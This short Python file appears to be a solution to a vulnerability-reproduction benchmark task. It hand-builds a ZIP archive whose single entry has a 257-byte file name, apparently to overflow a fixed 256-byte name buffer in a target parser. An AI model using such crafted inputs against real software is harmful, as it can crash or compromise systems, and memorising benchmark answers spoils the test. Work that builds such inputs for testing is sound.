import struct
from typing import Optional


def _le16(x: int) -> bytes:
    return struct.pack("<H", x & 0xFFFF)


def _le32(x: int) -> bytes:
    return struct.pack("<I", x & 0xFFFFFFFF)


def _make_minimal_zip_with_long_name(name_len: int = 257) -> bytes:
    if name_len <= 256:
        name_len = 257

    filename = (b"A" * name_len)

    # Local File Header (LFH)
    lfh = b"".join(
        [
            _le32(0x04034B50),  # signature
            _le16(20),          # version needed
            _le16(0),           # general purpose bit flag
            _le16(0),           # compression method (store)
            _le16(0),           # last mod file time
            _le16(0),           # last mod file date
            _le32(0),           # crc-32
            _le32(0),           # compressed size
            _le32(0),           # uncompressed size
            _le16(len(filename)),  # file name length
            _le16(0),           # extra field length
            filename,           # file name
        ]
    )
    file_data = b""

    # Central Directory File Header (CDFH)
    cdfh = b"".join(
        [
            _le32(0x02014B50),  # signature
            _le16(20),          # version made by
            _le16(20),          # version needed
            _le16(0),           # general purpose bit flag
            _le16(0),           # compression method
            _le16(0),           # last mod time
            _le16(0),           # last mod date
            _le32(0),           # crc-32
            _le32(0),           # compressed size
            _le32(0),           # uncompressed size
            _le16(len(filename)),  # file name length
            _le16(0),           # extra field length
            _le16(0),           # file comment length
            _le16(0),           # disk number start
            _le16(0),           # internal file attributes
            _le32(0),           # external file attributes
            _le32(0),           # relative offset of local header
            filename,           # file name
        ]
    )

    cd_offset = len(lfh) + len(file_data)
    cd_size = len(cdfh)

    # End of Central Directory Record (EOCD)
    eocd = b"".join(
        [
            _le32(0x06054B50),  # signature
            _le16(0),           # number of this disk
            _le16(0),           # disk where central directory starts
            _le16(1),           # number of central directory records on this disk
            _le16(1),           # total number of central directory records
            _le32(cd_size),     # size of central directory (bytes)
            _le32(cd_offset),   # offset of start of central directory
            _le16(0),           # zip file comment length
        ]
    )

    return lfh + file_data + cdfh + eocd


class Solution:
    def solve(self, src_path: str) -> bytes:
        return _make_minimal_zip_with_long_name(257)